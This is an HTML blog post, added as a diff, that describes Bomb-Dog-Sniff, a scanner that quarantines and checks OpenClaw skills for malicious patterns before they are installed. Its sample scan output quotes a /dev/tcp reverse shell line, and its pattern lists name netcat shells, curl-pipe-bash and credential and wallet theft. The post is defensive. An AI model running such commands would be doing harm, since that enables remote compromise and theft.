@@ -1,0 +1,219 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Bomb-Dog-Sniff: Your OpenClaw Security Scanner</title>
+    <meta name="description" content="Bomb-Dog-Sniff is a security-first skill management tool for OpenClaw that scans and quarantines skills for malicious patterns before installation, protecting y">
+    <meta property="og:title" content="Bomb-Dog-Sniff: Your OpenClaw Security Scanner">
+    <meta property="og:description" content="Bomb-Dog-Sniff is a security-first skill management tool for OpenClaw that scans and quarantines skills for malicious patterns before installation, protecting y">
+    <meta property="og:type" content="article">
+    <meta property="og:url" content="https://aloycwl.github.io/post/bomb-dog-sniff-your-openclaw-security-scanner">
+    <meta property="og:image" content="https://picsum.photos/1200/630?random=8632">
+    <meta name="twitter:image" content="https://picsum.photos/1200/630?random=8632">
+    <meta name="twitter:card" content="summary_large_image">
+    <link rel="canonical" href="https://aloycwl.github.io/post/bomb-dog-sniff-your-openclaw-security-scanner">
+    <style>
+        :root { color-scheme: light; }
+        body { margin: 0; font-family: system-ui, -apple-system, sans-serif; line-height: 1.6; color: #111; background: #fff; }
+        .container { max-width: 960px; margin: 0 auto; padding: 1rem; }
+        header { border-bottom: 1px solid #eee; padding-bottom: 1rem; margin-bottom: 2rem; }
+        header a { color: #111; text-decoration: none; font-weight: 600; font-size: 1.25rem; }
+        img { max-width: 100%; height: auto; border-radius: 4px; }
+        a { color: #0b57d0; text-decoration: none; }
+        a:hover { text-decoration: underline; }
+        .post-list { list-style: none; padding: 0; }
+        .post-item { padding: 0.75rem 0; border-bottom: 1px solid #f5f5f5; }
+        .post-title { font-size: 1.1rem; font-weight: 500; }
+        .post-date { font-size: 0.85rem; color: #718096; margin-top: 0.25rem; display: block; }
+        .pagination { display: flex; justify-content: center; gap: 1rem; margin-top: 2rem; padding: 1rem; }
+        .pagination a { padding: 0.5rem 1rem; border-radius: 4px; background: #edf2f7; color: #2d3748; }
+        .footer { margin-top: 3rem; padding-top: 2rem; border-top: 1px solid #eee; text-align: center; color: #718096; font-size: 0.9rem; }
+    </style>
+    <script>
+        document.addEventListener('DOMContentLoaded', async () => {
+            // AUTO UPDATE HEADER/FOOTER DYNAMICALLY FROM GLOBAL TEMPLATES
+            const [header, footer] = await Promise.all([
+                fetch('/templates/header.html').then(r => r.text()),
+                fetch('/templates/footer.html').then(r => r.text())
+            ]);
+            document.getElementById('site-header').innerHTML = header;
+            document.getElementById('site-footer').innerHTML = footer;
+        });
+    </script>
+</head>
+<body>
+<div id="site-header"></div>
+<div class="container">
+    <h1>Bomb-Dog-Sniff: Your OpenClaw Security Scanner</h1>
+    <p style="color:#718096; font-size:0.9rem;">2026-03-11</p>
+    <h2>What is Bomb-Dog-Sniff?</h2>
+<p>Bomb-Dog-Sniff is a security-first skill management tool for OpenClaw that acts like a bomb-sniffing dog for skills. It scans skills for malicious patterns before installation, ensuring only safe skills make it to your system. Think of it as your personal security guard that sniffs out threats like crypto stealers, keyloggers, reverse shells, and other malicious payloads before they can harm your system.</p>
+<h2>Why You Need Bomb-Dog-Sniff</h2>
+<p>In today&#8217;s open-source ecosystem, installing skills from untrusted sources can be risky. Malicious actors often hide dangerous code in seemingly innocent skills. Bomb-Dog-Sniff provides a crucial security layer by:</p>
+<ul>
+<li>Detecting crypto wallet stealers and private key harvesters</li>
+<li>Identifying reverse shells and remote code execution attempts</li>
+<li>Finding keyloggers and credential theft mechanisms</li>
+<li>Spotting supply chain attacks and typosquatting attempts</li>
+<li>Preventing prototype pollution vulnerabilities</li>
+<li>Blocking malicious npm/yarn scripts</li>
+</ul>
+<h2>Core Security Features</h2>
+<p>Bomb-Dog-Sniff v1.2.0 includes comprehensive security hardening:</p>
+<ul>
+<li><strong>Command Injection Protection</strong>: Fixed vulnerabilities in download functions</li>
+<li><strong>Path Traversal Protection</strong>: Sanitizes all path inputs to prevent directory traversal attacks</li>
+<li><strong>Secure Quarantine</strong>: Randomized directory names with restricted permissions (0o700)</li>
+<li><strong>Binary File Detection</strong>: Skips binary files to avoid false positives</li>
+<li><strong>File Size Limits</strong>: Prevents DoS via huge files with configurable limits</li>
+<li><strong>ReDoS Protection</strong>: Limits regex processing on long lines to prevent regular expression denial of service</li>
+</ul>
+<h2>Detection Capabilities</h2>
+<p>The scanner uses 60+ detection patterns across 13 categories:</p>
+<h3>Critical Threats</h3>
+<ul>
+<li><strong>Crypto Harvester</strong>: Private key extraction, wallet exports, mnemonic theft</li>
+<li><strong>Credential Theft</strong>: Environment variable exfiltration, config file theft, SSH key theft</li>
+<li><strong>Reverse Shell</strong>: Netcat shells, /dev/tcp/ redirects, socket-based shells, eval of remote code</li>
+<li><strong>Keylogger</strong>: Keyboard capture with exfiltration, clipboard theft, password field monitoring</li>
+<li><strong>Malicious Script</strong>: Pre/postinstall doing network/exec operations, modifying other packages</li>
+</ul>
+<h3>High-Risk Threats</h3>
+<ul>
+<li><strong>Encoded Payload</strong>: Base64 execution chains, hex escapes with eval context, obfuscated code</li>
+<li><strong>Suspicious API</strong>: Pastebin/ngrok/webhook destinations, dynamic URL construction with secrets</li>
+<li><strong>Pipe Bash</strong>: curl | bash, wget | sh patterns</li>
+<li><strong>Deposit Scam</strong>: &#8220;Send ETH to 0x&#8230;&#8221;, payment prompts in unexpected contexts</li>
+<li><strong>Supply Chain</strong>: Typosquatting, dynamic requires, suspicious postinstall scripts</li>
+<li><strong>Prototype Pollution</strong>: Dangerous object merging, __proto__ manipulation</li>
+</ul>
+<h3>Medium-Risk Threats</h3>
+<ul>
+<li><strong>Network Exfiltration</strong>: File reading followed by network transmission</li>
+<li><strong>File Tamper</strong>: .bashrc modification, crontab editing, SSH authorized_keys manipulation</li>
+</ul>
+<h2>Risk Scoring System</h2>
+<p>Bomb-Dog-Sniff uses a comprehensive risk scoring system from 0-100:</p>
+<ul>
+<li><strong>0-19: SAFE</strong> ✅ Install freely</li>
+<li><strong>20-39: LOW</strong> ⚠️ Review recommended</li>
+<li><strong>40-69: SUSPICIOUS</strong> 🚫 Blocked by default</li>
+<li><strong>70-100: MALICIOUS</strong> ☠️ Never install</li>
+</ul>
+<p>Each finding adds to the score based on severity and confidence:</p>
+<ul>
+<li><strong>CRITICAL</strong>: +25 points × confidence multiplier</li>
+<li><strong>HIGH</strong>: +15 points × confidence multiplier</li>
+<li><strong>MEDIUM</strong>: +5 points × confidence multiplier</li>
+</ul>
+<p>Confidence multipliers: High (1.0×), Medium (0.75×), Low (0.5×). Score caps at 100.</p>
+<h2>Available Commands</h2>
+<h3>scan</h3>
+<p>Scan a skill directory for malicious patterns:</p>
+<pre><code>openclaw skill bomb-dog-sniff scan &lt;path&gt; [options]
+</code></pre>
+<p>Options:</p>
+<ul>
+<li><code>-j, --json</code>: Output JSON only</li>
+<li><code>-v, --verbose</code>: Show detailed findings</li>
+<li><code>-t, --threshold N</code>: Set risk threshold (default: 40)</li>
+</ul>
+<h3>safe-install</h3>
+<p>Download from clawhub/GitHub, scan, and install only if safe:</p>
+<pre><code>openclaw skill bomb-dog-sniff safe-install &lt;source&gt; [options]
+</code></pre>
+<p>Source can be ClawHub skill name, GitHub URL, or local path.</p>
+<h3>audit</h3>
+<p>Audit an already-installed skill:</p>
+<pre><code>openclaw skill bomb-dog-sniff audit &lt;skill-name&gt; [options]
+</code></pre>
+<h3>batch</h3>
+<p>Scan multiple skills from a list file:</p>
+<pre><code>openclaw skill bomb-dog-sniff batch &lt;list-file&gt;
+</code></pre>
+<h2>How It Works</h2>
+<h3>Safe Install Process</h3>
+<p>The secure installation follows a 5-step process:</p>
+<ol>
+<li><strong>QUARANTINE</strong>: Skill downloaded to /tmp/bds-q-&lt;random&gt;/ with restricted permissions</li>
+<li><strong>SCAN</strong>: Check all files against detection patterns, skip binary/empty/large files, calculate entropy</li>
+<li><strong>DECISION</strong>: Risk > threshold? → BLOCK &#038; DELETE, Risk ≤ threshold? → PROCEED</li>
+<li><strong>INSTALL</strong>: Move from quarantine to skills directory, backup existing installation</li>
+<li><strong>CLEANUP</strong>: Securely remove quarantine directory</li>
+</ol>
+<h2>Quick Start Guide</h2>
+<h3>Scan Before Installing</h3>
+<pre><code># Sniff out threats before installing
+openclaw skill bomb-dog-sniff scan ./downloaded-skill
+</code></pre>
+<h3>Safe Install from ClawHub</h3>
+<pre><code># Safe install from clawhub (auto-downloads, sniffs, installs if clean)
+openclaw skill bomb-dog-sniff safe-install cool-skill
+</code></pre>
+<h3>Audit Installed Skills</h3>
+<pre><code># Audit an already-installed skill
+openclaw skill bomb-dog-sniff audit bird
+</code></pre>
+<h3>Batch Scanning</h3>
+<pre><code># Batch scan multiple skills
+openclaw skill bomb-dog-sniff batch skills-to-audit.txt
+</code></pre>
+<h2>Real-World Example</h2>
+<p>Here&#8217;s what a typical scan output looks like:</p>
+<pre><code>🔍 Bomb-Dog-Sniff Security Scanner v1.2.0
+Target: /home/user/skills/untrusted-skill
+
+🔴 CRITICAL (2)
+──────────────────────────────────────────────────
+crypto_harvester: scripts/wallet.js:23
+Crypto wallet private key harvesting detected
+Code: const privateKey = "a1b2c3..."
+Confidence: high
+
+reverse_shell: scripts/backdoor.sh:5
+Reverse shell or remote code execution detected
+Code: bash -i >& /dev/tcp/192.168.1.100/4444
+Confidence: high
+
+🟠 HIGH (1)
+──────────────────────────────────────────────────
+pipe_bash: install.sh:12
+Dangerous curl | bash pattern detected
+Confidence: high
+
+═══════════════════════════════════════════════════
+SCAN SUMMARY
+═══════════════════════════════════════════════════
+☠️ Risk Score: 75/100
+Risk Level: MALICIOUS
+Duration: 125ms
+Files Scanned: 12/15
+Files Skipped: 3 (binary/empty/large)
+Findings: 3
+Severity Breakdown:
+🔴 CRITICAL: 2
+🟠 HIGH: 1
+
+📋 Recommendation:
+MALICIOUS - Do not install. Found 3 critical security issues.
+Scan ID: bds-20260208-a1b2c3d4
+</code></pre>
+<h2>Security Best Practices</h2>
+<p>To maximize your security when using Bomb-Dog-Sniff:</p>
+<ol>
+<li>Always scan skills before installation, even from trusted sources</li>
+<li>Use a conservative risk threshold (lower = more cautious)</li>
+<li>Regularly audit your installed skills</li>
+<li>Keep Bomb-Dog-Sniff updated for the latest threat patterns</li>
+<li>Combine with other security tools for defense in depth</li>
+</ol>
+<h2>Conclusion</h2>
+<p>Bomb-Dog-Sniff provides essential security for the OpenClaw ecosystem. By automatically scanning skills for malicious patterns before installation, it prevents countless potential security incidents. Whether you&#8217;re a casual user or managing critical infrastructure, Bomb-Dog-Sniff gives you peace of mind by ensuring only safe, verified skills make it to your system.</p>
+<p>Remember: In the world of open-source software, security isn&#8217;t optional—it&#8217;s essential. Let Bomb-Dog-Sniff be your first line of defense against malicious skills.</p>
+<p>Skill can be found at: <a href="https://github.com/openclaw/skills/tree/main/skills/lvcidpsyche/skill-bomb-dog-sniff/SKILL.md">https://github.com/openclaw/skills/tree/main/skills/lvcidpsyche/skill-bomb-dog-sniff/SKILL.md</a></p>
+
+</div>
+<div id="site-footer"></div>
+</body>
+</html>
